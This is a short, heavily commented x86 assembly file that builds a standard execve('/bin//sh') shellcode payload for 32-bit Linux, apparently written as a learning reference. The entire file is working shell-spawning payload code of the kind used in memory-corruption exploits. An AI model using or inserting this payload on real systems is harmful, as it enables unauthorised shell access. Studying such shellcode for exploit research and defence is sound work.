[BITS 32]
; assemble with nasm -f elf32 shellcode.asm -o shellcode.o

; Note that we MUST have a valid stack for this to work!

xor ecx, ecx       ; zero ecx
mul ecx            ; edx:eax = eax*ecx, i.e. zeros edx and eax
mov al, 0xb        ; set eax to 0xb, syscall number for execve
push ecx           ; pushes a zero onto the stack (stack is \0\0\0\0)
push '//sh'        ; push '//sh' onto stack (stack is //sh\0\0\0\0)
push '/bin'        ; push '/bin' onto stack (stack is /bin//sh\0\0\0\0)
mov ebx, esp       ; set ebx (arg1: path) to stack pointer ('/bin//sh')
push ecx           ; push another zero (execve needs a NULL at the end)
push ebx           ; push addr of "/bin//sh"
mov ecx, esp       ; set ecx (arg2: argv) to ["/bin//sh", 0]
                   ; edx (arg3: envp) is already NULL from `mul ecx`
int 0x80            ; perform system call
